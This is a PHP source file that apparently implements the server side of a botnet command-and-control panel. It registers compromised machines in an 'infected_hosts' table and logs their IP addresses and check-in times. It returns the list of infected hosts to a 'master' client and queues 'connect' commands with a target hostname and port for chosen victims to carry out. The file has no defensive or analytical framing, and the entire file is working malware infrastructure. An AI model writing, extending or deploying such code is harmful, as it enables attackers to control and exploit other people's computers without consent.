<?php	
require("db-co.php");

/*
* <Master>
*/
function ProcessMasterRequest($data)
{
	switch ($data->command) {
		case 'ping':
			echo json_encode(array('isAlive' => true));
			break;
		case 'get_hosts':
			SendHostsToMaster();
			break;
		case 'connect_to_client':
			SetConnectionRequestForSlave($data);
			break;
	}
}


function SendHostsToMaster()
{
	global $p_base;
	$p_request = $p_base->query("SELECT id, name, ip, first_connection, last_connection FROM infected_hosts;");

	$response = array();
	while($result = $p_request->fetch()){
		array_push($response, array("hostId" => $result["id"],
								 "name" => $result["name"],
								 "ip" => $result["ip"],
								 "firstConnection" => $result["first_connection"],
								 "lastConnection" => $result["last_connection"]));
	}

	echo json_encode($response);
}


function SetConnectionRequestForSlave($data)
{
	global $p_base;	
	$p_request = $p_base->prepare("UPDATE infected_hosts SET command = 'connect', arguments = :args WHERE id = :id;");
	$p_request->execute(array('id' => $data->host_id,
							  'args' => 'hostname|||' . $data->hostname_ip . '|||port|||' . $data->port));

	$result = false;
	if($p_request->rowCount() == 1)
	{
		$result = true;
	}

	echo json_encode(array('result' => $result));

}
/*
* </Master>
*/



/*
* <Slave>
*/
function ProcessSlaveRequest($host_key, $name)
{
	global $p_base;
	// Check if the slave is already registered
	$p_request = $p_base->prepare("SELECT id, command, arguments FROM infected_hosts WHERE host_key = :host_key AND name = :name;");
	$p_request->execute(array('host_key' => $host_key, 'name' => $name));

	// Already registered
	if($result = $p_request->fetch())
	{
		// Get command and arguments
		$command = $result['command'];
		$arguments = $result['arguments'];

		if($command != null)
		{
			// Send command to client
			$response = array("command" => $command);
			if($arguments != null)
			{
				$response["arguments"] = CreateArgumentsDictionary($arguments);
			}

			echo json_encode($response);
		}

		// Update ip address, in case it changed and last connection DateTime
		// and erase command from database
		$p_request = $p_base->prepare("UPDATE infected_hosts SET ip = :ip, command = '', arguments = '', last_connection = :lastCo WHERE host_key = :host_key AND name = :name;");
		$p_request->execute(array('ip' => $_SERVER['REMOTE_ADDR'], 'host_key' => $host_key, 'name' => $name, 'lastCo' => date("Y-m-d H:i:s")));
	}
	else
	{
		// Register new slave
		$p_request = $p_base->prepare("INSERT into infected_hosts (host_key, name, ip, first_connection, last_connection) VALUES(:host_key, :name, :ip, :firstCo, :lastCo);");
		$p_request->execute(array('host_key' => $host_key, 'name' => $name, 'ip' => $_SERVER['REMOTE_ADDR'], 'firstCo' => date("Y-m-d H:i:s"), 'lastCo' => date("Y-m-d H:i:s")));
	}
}


function CreateArgumentsDictionary($argsString)
{
	$argsDictionary = array();
	// Arguments are splitted by '|||'
	$splitted = explode('|||', $argsString);
	for($i = 0; $i <= sizeof($splitted) - 2; $i += 2)
	{
		$argsDictionary[$splitted[$i]] = $splitted[$i + 1];
	}

	return $argsDictionary;
}
/*
* </Slave>
*/

?>
